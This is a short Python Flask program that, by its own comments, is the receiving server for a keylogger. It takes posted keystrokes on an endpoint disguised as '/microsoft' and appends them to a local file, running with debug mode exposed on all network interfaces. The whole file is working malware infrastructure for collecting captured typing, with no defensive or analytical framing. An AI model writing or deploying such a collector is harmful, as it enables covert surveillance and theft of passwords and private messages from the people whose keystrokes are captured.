from flask import Flask, request, jsonify

app = Flask(__name__)

# Endpoint to receive keystrokes from the keylogger
@app.route('/microsoft', methods=['POST'])
def receive_keystrokes():
    try:
        # Get the keystrokes from the incoming JSON payload
        data = request.get_json()
        keystrokes = data.get('microsoft', '')

        if keystrokes:
            # Here you can do something with the keystrokes, like logging them to a file
            with open("received_keystrokes.txt", "a", encoding="utf-8") as f:
                f.write(keystrokes)

            return jsonify({"status": "success", "message": "Keystrokes received."}), 200
        else:
            return jsonify({"status": "error", "message": "No keystrokes provided."}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # Expose the server on all interfaces, port 5000
